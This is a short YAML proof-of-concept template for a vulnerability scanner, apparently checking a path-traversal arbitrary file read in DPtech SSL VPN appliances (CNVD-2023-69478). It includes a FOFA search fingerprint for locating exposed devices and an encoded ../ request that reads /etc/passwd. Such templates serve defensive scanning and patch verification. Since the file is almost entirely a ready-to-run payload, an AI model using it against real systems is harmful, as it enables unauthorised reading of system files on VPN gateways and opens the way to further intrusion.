id: poc-yaml-dptech-ssl-vpn-anyfile-reads
info:
  name: 杭州迪普科技股份有限公司DPtech SSL VPN任意文件读取漏洞
  severity: medium
  tags:
  - CNVD-2023-69478
  - 两高一弱
  finger: DPtech SSL VPN
  fofa: app="DPtech-SSLVPN"，cert="DPtechCa"
requests:
- method: GET
  path: /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
  expression: 'status_code == 200 &&

    contains(body,"root:") &&

    contains(body,"/bin/bash") &&

    !contains(body,"<")

    '
variables: {}
transport: http
